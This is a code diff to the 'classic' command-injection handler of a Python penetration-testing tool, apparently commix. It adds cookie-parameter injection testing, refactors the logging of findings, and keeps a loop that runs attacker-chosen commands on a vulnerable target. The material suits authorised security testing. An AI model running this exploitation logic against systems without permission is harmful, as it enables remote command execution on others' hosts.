@@ -25,7 +25,9 @@ import urllib
 import urllib2
 
 from src.utils import menu
+from src.utils import logs
 from src.utils import settings
+
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.requests import headers
@@ -40,16 +42,17 @@ from src.core.injections.results_based.techniques.classic import cb_file_access
   The "classic" technique on Result-based OS Command Injection.
 """
 
-#---------------------------------------------
-# The "classic" injection technique handler.
-#---------------------------------------------
+"""
+The "classic" injection technique handler.
+"""
 def cb_injection_handler(url, delay, filename, http_request_method):
   
-  counter = 0
+  counter = 1
   vp_flag = True
   no_result = True
   is_encoded= False
   export_injection_info = False
+
   injection_type = "Results-based Command Injection"
   technique = "classic injection technique"
       
@@ -81,14 +84,14 @@ def cb_injection_handler(url, delay, filename, http_request_method):
           alter_shell = menu.options.alter_shell
         
           try:
-            if not alter_shell:
-              # Classic decision payload (check if host is vulnerable).
-              payload = cb_payloads.decision(separator, TAG, randv1, randv2)
-            else:
+            if alter_shell:
               # Classic -alter shell- decision payload (check if host is vulnerable).
               payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
+            else:
+              # Classic decision payload (check if host is vulnerable).
+              payload = cb_payloads.decision(separator, TAG, randv1, randv2)
             
-            # Fix prefixes / suffixes
+            # Define prefixes & suffixes
             payload = parameters.prefixes(payload, prefix)
             payload = parameters.suffixes(payload, suffix)
 
@@ -101,16 +104,23 @@ def cb_injection_handler(url, delay, filename, http_request_method):
             if menu.options.verbose:
               sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)
               
-            # Check if target host is vulnerable.
-            response, vuln_parameter = cb_injector.injection_test(payload, http_request_method, url)
-
             # if need page reload
             if menu.options.url_reload:
               time.sleep(delay)
               response = urllib.urlopen(url)
-              
+
+            # Cookie Injection
+            if settings.COOKIE_INJECTION == True:
+              # Check if target host is vulnerable to cookie injection.
+              vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
+              response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)
+            else:
+              # Check if target host is vulnerable.
+              response, vuln_parameter = cb_injector.injection_test(payload, http_request_method, url)
+
             # Evaluate test results.
             shell = cb_injector.injection_test_results(response, TAG, randvcalc)
+
             if not menu.options.verbose:
               percent = ((i*100)/total)
               if percent == 100:
@@ -137,59 +147,28 @@ def cb_injection_handler(url, delay, filename, http_request_method):
             found = True
             no_result = False
 
+            if settings.COOKIE_INJECTION == True: 
+              http_request_method = "cookie"
+              found_vuln_parameter = vuln_parameter
+            else:
+              if http_request_method == "GET":
+                found_vuln_parameter = parameters.vuln_GET_param(url)
+              else :
+                found_vuln_parameter = vuln_parameter
+
             # Print the findings to log file.
             if export_injection_info == False:
-              output_file = open(filename + ".txt", "a")
-              output_file.write("\n(+) Type : " + injection_type)
-              output_file.write("\n(+) Technique : " + technique.title())
-              output_file.close()
-              export_injection_info = True
-
-            if http_request_method == "GET":
-              # Print the findings to log file
-              if vp_flag == True:
-                output_file = open(filename + ".txt", "a")
-                output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-                output_file.write("\n")
-                vp_flag = False
-                output_file.close()
-                
-              counter = counter + 1
-              output_file = open(filename + ".txt", "a")
-              output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
-              output_file.close()
-              
-              #Vulnerable Parameter
-              GET_vuln_param = parameters.vuln_GET_param(url)
-
-              # Print the findings to terminal.
-              print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + GET_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
-              print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-              print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
-
-            else :
-              # Print the findings to log file
-              if vp_flag == True:
-                output_file = open(filename + ".txt", "a")
-                output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
-                output_file.write("\n")
-                vp_flag = False
-                output_file.close()
-                
-              counter = counter + 1
-              output_file = open(filename + ".txt", "a")
-              output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
-              output_file.close()
-              
-              #Vulnerable Parameter
-              POST_vuln_param = vuln_parameter
-              
-              # Print the findings to terminal.
-              print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + POST_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
-              print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-              print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
+              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
+            if vp_flag == True:
+              vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
+            logs.upload_payload(filename, counter, payload) 
+            counter = counter + 1
+            
+            # Print the findings to terminal.
+            print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
+            print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
+            print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+            print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
               
             # Check for any enumeration options.
             cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
@@ -210,7 +189,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                       sys.exit(0)
                       
                     else:
-                      # The main command injection exploitation.
+                      # Command execution results.
                       response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
                       
                       # if need page reload
@@ -218,7 +197,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                         time.sleep(delay)
                         response = urllib.urlopen(url)
                         
-                      # Command execution results.
+                      # Evaluate injection results.
                       shell = cb_injector.injection_results(response, TAG)
                       if shell:
                         shell = "".join(str(p) for p in shell)
@@ -251,8 +230,13 @@ def cb_injection_handler(url, delay, filename, http_request_method):
     sys.stdout.write("\r")
     sys.stdout.flush()
     
+"""
+The exploitation function.
+(call the injection handler)
+"""
 def exploitation(url, delay, filename, http_request_method):
   if cb_injection_handler(url, delay, filename, http_request_method) == False:
     return False
+
 
 #eof
